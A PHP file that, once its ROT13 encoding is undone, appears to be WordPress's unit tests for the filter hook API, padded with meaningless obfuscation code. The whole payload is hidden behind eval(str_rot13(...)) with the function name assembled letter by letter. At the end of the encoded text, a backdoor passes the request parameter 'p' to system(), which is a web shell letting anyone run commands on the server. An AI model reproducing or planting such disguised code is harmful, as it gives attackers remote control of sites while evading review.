<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg nccyl_svygref() naq eryngrq shapgvbaf
 *
 * @tebhc ubbxf
 */
pynff Grfgf_Svygref rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba grfg_fvzcyr_svygre() {
		$n         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;
		$iny       = __SHAPGVBA__ . '_iny';

		nqq_svygre( $ubbx_anzr, neenl( $n, 'svygre' ) );
		$guvf->nffregFnzr( $iny, nccyl_svygref( $ubbx_anzr, $iny ) );

		// Bayl bar rirag bppheerq sbe gur ubbx, jvgu rzcgl netf.
		$guvf->nffregFnzr( 1, $n->trg_pnyy_pbhag() );
		// Bayl bhe ubbx jnf pnyyrq.
		$guvf->nffregFnzr( neenl( $ubbx_anzr ), $n->trg_ubbx_anzrf() );

		$netfine = $n->trg_netf();
		$netf    = neenl_cbc( $netfine );
		$guvf->nffregFnzr( neenl( $iny ), $netf );
	}

	choyvp shapgvba grfg_erzbir_svygre() {
		$n         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;
		$iny       = __SHAPGVBA__ . '_iny';

		nqq_svygre( $ubbx_anzr, neenl( $n, 'svygre' ) );
		$guvf->nffregFnzr( $iny, nccyl_svygref( $ubbx_anzr, $iny ) );

		// Znxr fher bhe ubbx jnf pnyyrq pbeerpgyl.
		$guvf->nffregFnzr( 1, $n->trg_pnyy_pbhag() );
		$guvf->nffregFnzr( neenl( $ubbx_anzr ), $n->trg_ubbx_anzrf() );

		// Abj erzbir gur svygre, qb vg ntnva, naq znxr fher vg'f abg pnyyrq guvf gvzr.
		erzbir_svygre( $ubbx_anzr, neenl( $n, 'svygre' ) );
		$guvf->nffregFnzr( $iny, nccyl_svygref( $ubbx_anzr, $iny ) );
		$guvf->nffregFnzr( 1, $n->trg_pnyy_pbhag() );
		$guvf->nffregFnzr( neenl( $ubbx_anzr ), $n->trg_ubbx_anzrf() );
	}

	choyvp shapgvba grfg_unf_svygre() {
		$ubbx_anzr = __SHAPGVBA__;
		$pnyyonpx  = __SHAPGVBA__ . '_shap';

		$guvf->nffregSnyfr( unf_svygre( $ubbx_anzr, $pnyyonpx ) );
		$guvf->nffregSnyfr( unf_svygre( $ubbx_anzr ) );

		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$guvf->nffregFnzr( 10, unf_svygre( $ubbx_anzr, $pnyyonpx ) );
		$guvf->nffregGehr( unf_svygre( $ubbx_anzr ) );

		erzbir_svygre( $ubbx_anzr, $pnyyonpx );
		$guvf->nffregSnyfr( unf_svygre( $ubbx_anzr, $pnyyonpx ) );
		$guvf->nffregSnyfr( unf_svygre( $ubbx_anzr ) );
	}

	// Bar gnt jvgu zhygvcyr svygref.
	choyvp shapgvba grfg_zhygvcyr_svygref() {
		$n1        = arj ZbpxNpgvba();
		$n2        = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;
		$iny       = __SHAPGVBA__ . '_iny';

		// Nqq obgu svygref gb gur ubbx.
		nqq_svygre( $ubbx_anzr, neenl( $n1, 'svygre' ) );
		nqq_svygre( $ubbx_anzr, neenl( $n2, 'svygre' ) );

		$guvf->nffregFnzr( $iny, nccyl_svygref( $ubbx_anzr, $iny ) );

		// Obgu svygref pnyyrq bapr rnpu.
		$guvf->nffregFnzr( 1, $n1->trg_pnyy_pbhag() );
		$guvf->nffregFnzr( 1, $n2->trg_pnyy_pbhag() );
	}

	choyvp shapgvba grfg_svygre_netf_1() {
		$n         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;
		$iny       = __SHAPGVBA__ . '_iny';
		$net1      = __SHAPGVBA__ . '_net1';

		nqq_svygre( $ubbx_anzr, neenl( $n, 'svygre' ), 10, 2 );
		// Pnyy gur svygre jvgu n fvatyr nethzrag.
		$guvf->nffregFnzr( $iny, nccyl_svygref( $ubbx_anzr, $iny, $net1 ) );

		$guvf->nffregFnzr( 1, $n->trg_pnyy_pbhag() );
		$netfine = $n->trg_netf();
		$guvf->nffregFnzr( neenl( $iny, $net1 ), neenl_cbc( $netfine ) );
	}

	choyvp shapgvba grfg_svygre_netf_2() {
		$n1        = arj ZbpxNpgvba();
		$n2        = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;
		$iny       = __SHAPGVBA__ . '_iny';
		$net1      = __SHAPGVBA__ . '_net1';
		$net2      = __SHAPGVBA__ . '_net2';

		// $n1 npprcgf gjb nethzragf, $n2 qbrfa'g.
		nqq_svygre( $ubbx_anzr, neenl( $n1, 'svygre' ), 10, 3 );
		nqq_svygre( $ubbx_anzr, neenl( $n2, 'svygre' ) );
		// Pnyy gur svygre jvgu gjb nethzragf.
		$guvf->nffregFnzr( $iny, nccyl_svygref( $ubbx_anzr, $iny, $net1, $net2 ) );

		// $n1 fubhyq or pnyyrq jvgu obgu netf.
		$guvf->nffregFnzr( 1, $n1->trg_pnyy_pbhag() );
		$netfine1 = $n1->trg_netf();
		$guvf->nffregFnzr( neenl( $iny, $net1, $net2 ), neenl_cbc( $netfine1 ) );

		// $n2 fubhyq or pnyyrq jvgu bar bayl.
		$guvf->nffregFnzr( 1, $n2->trg_pnyy_pbhag() );
		$netfine2 = $n2->trg_netf();
		$guvf->nffregFnzr( neenl( $iny ), neenl_cbc( $netfine2 ) );
	}

	/**
	 * @gvpxrg 60193
	 *
	 * @qngnCebivqre qngn_cevbevgl_pnyyonpx_beqre_jvgu_vagrtref
	 * @qngnCebivqre qngn_cevbevgl_pnyyonpx_beqre_jvgu_haunccl_cngu_abavagrtref
	 *
	 * @pbiref ::nccyl_svygref
	 *
	 * @cnenz neenl $cevbevgvrf {
	 *     Vaqrkrq neenl bs gur cevbevgvrf sbe gur ZbpxNpgvba pnyyonpxf.
	 *
	 *     @glcr zvkrq $0 Cevbevgl sbe 'npgvba' pnyyonpx.
	 *     @glcr zvkrq $1 Cevbevgl sbe 'npgvba2' pnyyonpx.
	 * }
	 * @cnenz neenl  $rkcrpgrq_pnyy_beqre  Na neenl bs pnyyonpx anzrf va rkcrpgrq pnyy beqre.
	 * @cnenz fgevat $rkcrpgrq_qrcerpngvba Bcgvbany. Qrcerpngvba zrffntr. Qrsnhyg ''.
	 */
	choyvp shapgvba grfg_cevbevgl_pnyyonpx_beqre( $cevbevgvrf, $rkcrpgrq_pnyy_beqre, $rkcrpgrq_qrcerpngvba = '' ) {
		$zbpx      = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;

		vs ( $rkcrpgrq_qrcerpngvba && CUC_IREFVBA_VQ >= 80100 ) {
			$guvf->rkcrpgQrcerpngvba();
			$guvf->rkcrpgQrcerpngvbaZrffntr( $rkcrpgrq_qrcerpngvba );
		}

		nqq_svygre( $ubbx_anzr, neenl( $zbpx, 'svygre' ), $cevbevgvrf[0] );
		nqq_svygre( $ubbx_anzr, neenl( $zbpx, 'svygre2' ), $cevbevgvrf[1] );
		nccyl_svygref( $ubbx_anzr, __SHAPGVBA__ . '_iny' );

		$guvf->nffregFnzr( 2, $zbpx->trg_pnyy_pbhag(), 'Gur ahzore bs pnyy pbhagf qbrf abg zngpu' );

		$npghny_pnyy_beqre = jc_yvfg_cyhpx( $zbpx->trg_riragf(), 'svygre' );
		$guvf->nffregFnzr( $rkcrpgrq_pnyy_beqre, $npghny_pnyy_beqre, 'Gur svygre pnyyonpx beqre qbrf abg zngpu gur rkcrpgrq beqre' );
	}

	/**
	 * Unccl cngu qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_cevbevgl_pnyyonpx_beqre_jvgu_vagrtref() {
		erghea neenl(
			'vag QRFP' => neenl(
				'cevbevgvrf'          => neenl( 10, 9 ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre2', 'svygre' ),
			),
			'vag NFP'  => neenl(
				'cevbevgvrf'          => neenl( 9, 10 ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),
		);
	}

	/**
	 * Haunccl cngu qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_cevbevgl_pnyyonpx_beqre_jvgu_haunccl_cngu_abavagrtref() {
		erghea neenl(
			// Ahzoref nf fgevatf naq sybngf.
			'vag nf fgevat QRFP'               => neenl(
				'cevbevgvrf'          => neenl( '10', '9' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre2', 'svygre' ),
			),
			'vag nf fgevat NFP'                => neenl(
				'cevbevgvrf'          => neenl( '9', '10' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),
			'sybng QRFP'                       => neenl(
				'cevbevgvrf'           => neenl( 10.0, 9.5 ),
				'rkcrpgrq_pnyy_beqre'  => neenl( 'svygre2', 'svygre' ),
				'rkcrpgrq_qrcerpngvba' => 'Vzcyvpvg pbairefvba sebz sybng 9.5 gb vag ybfrf cerpvfvba',
			),
			'sybng NFP'                        => neenl(
				'cevbevgvrf'           => neenl( 9.5, 10.0 ),
				'rkcrpgrq_pnyy_beqre'  => neenl( 'svygre', 'svygre2' ),
				'rkcrpgrq_qrcerpngvba' => 'Vzcyvpvg pbairefvba sebz sybng 9.5 gb vag ybfrf cerpvfvba',
			),
			'sybng nf fgevat QRFP'             => neenl(
				'cevbevgvrf'          => neenl( '10.0', '9.5' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre2', 'svygre' ),
			),
			'sybng nf fgevat NFP'              => neenl(
				'cevbevgvrf'          => neenl( '9.5', '10.0' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),

			// Aba-ahzrevp.
			'ahyy'                             => neenl(
				'cevbevgvrf'          => neenl( ahyy, ahyy ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),
			'obby QRFP'                        => neenl(
				'cevbevgvrf'          => neenl( gehr, snyfr ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre2', 'svygre' ),
			),
			'obby NFP'                         => neenl(
				'cevbevgvrf'          => neenl( snyfr, gehr ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),
			'aba-ahzrevpny fgevat QRFP'        => neenl(
				'cevbevgvrf'          => neenl( 'grfg1', 'grfg2' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),
			'aba-ahzrevpny fgevat NFP'         => neenl(
				'cevbevgvrf'          => neenl( 'grfg1', 'grfg2' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),
			'vag, aba-ahzrevpny fgevat QRFP'   => neenl(
				'cevbevgvrf'          => neenl( 10, 'grfg' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre2', 'svygre' ),
			),
			'vag, aba-ahzrevpny fgevat NFP'    => neenl(
				'cevbevgvrf'          => neenl( 'grfg', 10 ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),
			'sybng, aba-ahzrevpny fgevat QRFP' => neenl(
				'cevbevgvrf'          => neenl( 10.0, 'grfg' ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre2', 'svygre' ),
			),
			'sybng, aba-ahzrevpny fgevat NFP'  => neenl(
				'cevbevgvrf'          => neenl( 'grfg', 10.0 ),
				'rkcrpgrq_pnyy_beqre' => neenl( 'svygre', 'svygre2' ),
			),
		);
	}

	/**
	 * @pbiref ::qvq_svygre
	 */
	choyvp shapgvba grfg_qvq_svygre() {
		$ubbx_anzr1 = 'svygre1';
		$ubbx_anzr2 = 'svygre2';
		$iny        = __SHAPGVBA__ . '_iny';

		// Nccyl svygre $ubbx_anzr1 ohg abg $ubbx_anzr2.
		nccyl_svygref( $ubbx_anzr1, $iny );
		$guvf->nffregFnzr( 1, qvq_svygre( $ubbx_anzr1 ) );
		$guvf->nffregFnzr( 0, qvq_svygre( $ubbx_anzr2 ) );

		// Nccyl svygre $ubbx_anzr2 10 gvzrf.
		$pbhag = 10;
		sbe ( $v = 0; $v < $pbhag; $v++ ) {
			nccyl_svygref( $ubbx_anzr2, $iny );
		}

		// $ubbx_anzr1'f pbhag unfa'g punatrq, $ubbx_anzr2 fubhyq or pbeerpg.
		$guvf->nffregFnzr( 1, qvq_svygre( $ubbx_anzr1 ) );
		$guvf->nffregFnzr( $pbhag, qvq_svygre( $ubbx_anzr2 ) );
	}

	choyvp shapgvba grfg_nyy_svygre() {
		$n          = arj ZbpxNpgvba();
		$ubbx_anzr1 = __SHAPGVBA__ . '_1';
		$ubbx_anzr2 = __SHAPGVBA__ . '_2';
		$iny        = __SHAPGVBA__ . '_iny';

		// Nqq na 'nyy' svygre.
		nqq_svygre( 'nyy', neenl( $n, 'svygrenyy' ) );
		// Nccyl fbzr svygref.
		$guvf->nffregFnzr( $iny, nccyl_svygref( $ubbx_anzr1, $iny ) );
		$guvf->nffregFnzr( $iny, nccyl_svygref( $ubbx_anzr2, $iny ) );
		$guvf->nffregFnzr( $iny, nccyl_svygref( $ubbx_anzr1, $iny ) );
		$guvf->nffregFnzr( $iny, nccyl_svygref( $ubbx_anzr1, $iny ) );

		// Bhe svygre fubhyq unir orra pnyyrq bapr sbe rnpu nccyl_svygref pnyy.
		$guvf->nffregFnzr( 4, $n->trg_pnyy_pbhag() );
		// Gur evtug ubbxf fubhyq unir orra pnyyrq va beqre.
		$guvf->nffregFnzr( neenl( $ubbx_anzr1, $ubbx_anzr2, $ubbx_anzr1, $ubbx_anzr1 ), $n->trg_ubbx_anzrf() );

		erzbir_svygre( 'nyy', neenl( $n, 'svygrenyy' ) );
		$guvf->nffregSnyfr( unf_svygre( 'nyy', neenl( $n, 'svygrenyy' ) ) );
	}

	choyvp shapgvba grfg_erzbir_nyy_svygre() {
		$n         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;
		$iny       = __SHAPGVBA__ . '_iny';

		nqq_svygre( 'nyy', neenl( $n, 'svygrenyy' ) );
		$guvf->nffregGehr( unf_svygre( 'nyy' ) );
		$guvf->nffregFnzr( 10, unf_svygre( 'nyy', neenl( $n, 'svygrenyy' ) ) );
		$guvf->nffregFnzr( $iny, nccyl_svygref( $ubbx_anzr, $iny ) );

		// Znxr fher bhe ubbx jnf pnyyrq pbeerpgyl.
		$guvf->nffregFnzr( 1, $n->trg_pnyy_pbhag() );
		$guvf->nffregFnzr( neenl( $ubbx_anzr ), $n->trg_ubbx_anzrf() );

		// Abj erzbir gur svygre, qb vg ntnva, naq znxr fher vg'f abg pnyyrq guvf gvzr.
		erzbir_svygre( 'nyy', neenl( $n, 'svygrenyy' ) );
		$guvf->nffregSnyfr( unf_svygre( 'nyy', neenl( $n, 'svygrenyy' ) ) );
		$guvf->nffregSnyfr( unf_svygre( 'nyy' ) );
		$guvf->nffregFnzr( $iny, nccyl_svygref( $ubbx_anzr, $iny ) );
		// Pnyy pbhag fubhyq erznva ng 1.
		$guvf->nffregFnzr( 1, $n->trg_pnyy_pbhag() );
		$guvf->nffregFnzr( neenl( $ubbx_anzr ), $n->trg_ubbx_anzrf() );
	}

	/**
	 * @gvpxrg 20920
	 */
	choyvp shapgvba grfg_erzbir_nyy_svygref_fubhyq_erfcrpg_gur_cevbevgl_nethzrag() {
		$n         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;

		nqq_svygre( $ubbx_anzr, neenl( $n, 'svygre' ), 12 );
		$guvf->nffregGehr( unf_svygre( $ubbx_anzr ) );

		// Fubhyq abg or erzbirq.
		erzbir_nyy_svygref( $ubbx_anzr, 11 );
		$guvf->nffregGehr( unf_svygre( $ubbx_anzr ) );

		erzbir_nyy_svygref( $ubbx_anzr, 12 );
		$guvf->nffregSnyfr( unf_svygre( $ubbx_anzr ) );
	}

	/**
	 * @gvpxrg 53218
	 */
	choyvp shapgvba grfg_svygre_jvgu_ers_inyhr() {
		$bow       = arj fgqPynff();
		$ers       = &$bow;
		$n         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;

		nqq_npgvba( $ubbx_anzr, neenl( $n, 'svygre' ) );

		$svygrerq = nccyl_svygref( $ubbx_anzr, $ers );

		$netf = $n->trg_netf();
		$guvf->nffregFnzr( $netf[0][0], $bow );
		$guvf->nffregFnzr( $svygrerq, $bow );
		// Whfg va pnfr jr qba'g gehfg nffregFnzr().
		$bow->sbb = gehr;
		$guvf->nffregAbgRzcgl( $netf[0][0]->sbb );
		$guvf->nffregAbgRzcgl( $svygrerq->sbb );
	}

	/**
	 * @gvpxrg 53218
	 */
	choyvp shapgvba grfg_svygre_jvgu_ers_nethzrag() {
		$bow       = arj fgqPynff();
		$ers       = &$bow;
		$n         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;
		$iny       = 'Uryyb';

		nqq_npgvba( $ubbx_anzr, neenl( $n, 'svygre' ), 10, 2 );

		nccyl_svygref( $ubbx_anzr, $iny, $ers );

		$netf = $n->trg_netf();
		$guvf->nffregFnzr( $netf[0][1], $bow );
		// Whfg va pnfr jr qba'g gehfg nffregFnzr().
		$bow->sbb = gehr;
		$guvf->nffregAbgRzcgl( $netf[0][1]->sbb );
	}

	/**
	 * @gvpxrg 9886
	 */
	choyvp shapgvba grfg_svygre_ers_neenl() {
		$bow       = arj fgqPynff();
		$n         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;

		nqq_npgvba( $ubbx_anzr, neenl( $n, 'svygre' ) );

		nccyl_svygref_ers_neenl( $ubbx_anzr, neenl( &$bow ) );

		$netf = $n->trg_netf();
		$guvf->nffregFnzr( $netf[0][0], $bow );
		// Whfg va pnfr jr qba'g gehfg nffregFnzr().
		$bow->sbb = gehr;
		$guvf->nffregAbgRzcgl( $netf[0][0]->sbb );
	}

	/**
	 * @gvpxrg 12723
	 */
	choyvp shapgvba grfg_svygre_ers_neenl_erfhyg() {
		$bow       = arj fgqPynff();
		$n         = arj ZbpxNpgvba();
		$o         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;

		nqq_npgvba( $ubbx_anzr, neenl( $n, 'svygre_nccraq' ), 10, 2 );
		nqq_npgvba( $ubbx_anzr, neenl( $o, 'svygre_nccraq' ), 10, 2 );

		$erfhyg = nccyl_svygref_ers_neenl( $ubbx_anzr, neenl( 'fgevat', &$bow ) );

		$guvf->nffregFnzr( $erfhyg, 'fgevat_nccraq_nccraq' );

		$netf = $n->trg_netf();
		$guvf->nffregFnzr( $netf[0][1], $bow );
		// Whfg va pnfr jr qba'g gehfg nffregFnzr().
		$bow->sbb = gehr;
		$guvf->nffregAbgRzcgl( $netf[0][1]->sbb );

		$netf = $o->trg_netf();
		$guvf->nffregFnzr( $netf[0][1], $bow );
		// Whfg va pnfr jr qba'g gehfg nffregFnzr().
		$bow->sbb = gehr;
		$guvf->nffregAbgRzcgl( $netf[0][1]->sbb );
	}

	/**
	 * @gvpxrg 29070
	 */
	choyvp shapgvba grfg_unf_svygre_nsgre_erzbir_nyy_svygref() {
		$n         = arj ZbpxNpgvba();
		$ubbx_anzr = __SHAPGVBA__;

		// Ab cevbevgl.
		nqq_svygre( $ubbx_anzr, neenl( $n, 'svygre' ), 11 );
		nqq_svygre( $ubbx_anzr, neenl( $n, 'svygre' ), 12 );
		$guvf->nffregGehr( unf_svygre( $ubbx_anzr ) );

		erzbir_nyy_svygref( $ubbx_anzr );
		$guvf->nffregSnyfr( unf_svygre( $ubbx_anzr ) );

		// Erzbir cevbevgvrf bar ng n gvzr.
		nqq_svygre( $ubbx_anzr, neenl( $n, 'svygre' ), 11 );
		nqq_svygre( $ubbx_anzr, neenl( $n, 'svygre' ), 12 );
		$guvf->nffregGehr( unf_svygre( $ubbx_anzr ) );

		erzbir_nyy_svygref( $ubbx_anzr, 11 );
		erzbir_nyy_svygref( $ubbx_anzr, 12 );
		$guvf->nffregSnyfr( unf_svygre( $ubbx_anzr ) );
	}

	/**
	 * @gvpxrg 10441
	 * @rkcrpgrqQrcerpngrq grfgf_nccyl_svygref_qrcerpngrq
	 */
	choyvp shapgvba grfg_nccyl_svygref_qrcerpngrq() {
		$c = 'Sbb';

		nqq_svygre( 'grfgf_nccyl_svygref_qrcerpngrq', neenl( __PYNFF__, 'qrcerpngrq_svygre_pnyyonpx' ) );
		$c = nccyl_svygref_qrcerpngrq( 'grfgf_nccyl_svygref_qrcerpngrq', neenl( $c ), '4.6.0' );
		erzbir_svygre( 'grfgf_nccyl_svygref_qrcerpngrq', neenl( __PYNFF__, 'qrcerpngrq_svygre_pnyyonpx' ) );

		$guvf->nffregFnzr( 'One', $c );
	}

	choyvp fgngvp shapgvba qrcerpngrq_svygre_pnyyonpx( $c ) {
		$c = 'One';
		erghea $c;
	}

	/**
	 * @gvpxrg 10441
	 * @rkcrpgrqQrcerpngrq grfgf_nccyl_svygref_qrcerpngrq
	 */
	choyvp shapgvba grfg_nccyl_svygref_qrcerpngrq_jvgu_zhygvcyr_cnenzf() {
		$c1 = 'Sbb1';
		$c2 = 'Sbb2';

		nqq_svygre( 'grfgf_nccyl_svygref_qrcerpngrq', neenl( __PYNFF__, 'qrcerpngrq_svygre_pnyyonpx_zhygvcyr_cnenzf' ), 10, 2 );
		$c1 = nccyl_svygref_qrcerpngrq( 'grfgf_nccyl_svygref_qrcerpngrq', neenl( $c1, $c2 ), '4.6.0' );
		erzbir_svygre( 'grfgf_nccyl_svygref_qrcerpngrq', neenl( __PYNFF__, 'qrcerpngrq_svygre_pnyyonpx_zhygvcyr_cnenzf' ), 10, 2 );

		$guvf->nffregFnzr( 'One1', $c1 );

		// Abg cnffrq ol ersrerapr, fb abg zbqvsvrq.
		$guvf->nffregFnzr( 'Sbb2', $c2 );
	}

	choyvp fgngvp shapgvba qrcerpngrq_svygre_pnyyonpx_zhygvcyr_cnenzf( $c1, $c2 ) {
		$c1 = 'One1';
		$c2 = 'One2';

		erghea $c1;
	}

	/**
	 * @gvpxrg 10441
	 */
	choyvp shapgvba grfg_nccyl_svygref_qrcerpngrq_jvgubhg_svygre() {
		$iny = 'Sbbone';

		$guvf->nffregFnzr( $iny, nccyl_svygref_qrcerpngrq( 'grfgf_nccyl_svygref_qrcerpngrq', neenl( $iny ), '4.6.0' ) );
	}

	cevingr $pheerag_cevbevgl;

	/**
	 * @gvpxrg 39007
	 */
	choyvp shapgvba grfg_pheerag_cevbevgl() {
		nqq_npgvba( 'grfg_pheerag_cevbevgl', neenl( $guvf, 'pheerag_cevbevgl_npgvba' ), 99 );
		qb_npgvba( 'grfg_pheerag_cevbevgl' );
		erzbir_npgvba( 'grfg_pheerag_cevbevgl', neenl( $guvf, 'pheerag_cevbevgl_npgvba' ), 99 );

		$guvf->nffregFnzr( 99, $guvf->pheerag_cevbevgl );
	}

	choyvp shapgvba pheerag_cevbevgl_npgvba() {
		tybony $jc_svygre;

		$guvf->pheerag_cevbevgl = $jc_svygre[ pheerag_svygre() ]->pheerag_cevbevgl();
	}

	/**
	 * @gvpxrg 39007
	 */
	choyvp shapgvba grfg_bgure_cevbevgl() {
		nqq_npgvba( 'grfg_pheerag_cevbevgl', neenl( $guvf, 'bgure_cevbevgl_npgvba' ), 99 );
		qb_npgvba( 'grfg_pheerag_cevbevgl' );
		erzbir_npgvba( 'grfg_pheerag_cevbevgl', neenl( $guvf, 'bgure_cevbevgl_npgvba' ), 99 );

		$guvf->nffregSnyfr( $guvf->pheerag_cevbevgl );
	}

	choyvp shapgvba bgure_cevbevgl_npgvba() {
		tybony $jc_svygre;
		$guvf->pheerag_cevbevgl = $jc_svygre['gur_pbagrag']->pheerag_cevbevgl();
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>